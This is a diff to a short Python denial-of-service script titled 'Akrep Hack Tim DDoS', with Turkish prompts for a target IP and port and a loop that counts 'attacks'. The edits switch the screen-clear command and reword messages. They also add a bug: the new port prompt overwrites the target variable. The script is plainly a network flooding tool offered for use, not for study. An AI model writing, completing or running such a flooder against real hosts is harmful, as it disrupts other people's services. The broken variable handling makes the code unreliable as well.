@@ -1,7 +1,7 @@
 import socket
 import threading
 import os
-os.system("clear")
+os.system("cls")
 banner="""
 ###############################
 #Akrep Hack Tim DDoS          #
@@ -9,9 +9,9 @@ banner="""
 ###############################
 """
 print (banner)
-target = input("hedef ip: ")
-port = 80
 
+target = input("hedef ip: ")
+target = input("hedef port: ")
 attack_num = 0
 def attack():
     while True:
@@ -21,7 +21,7 @@ def attack():
 
         global attack_num
         attack_num += 1
-        print("Saldiri Basladi!")
+        print("Saldiri Baslamistir!")
         print(attack_num)
 
         s.close()
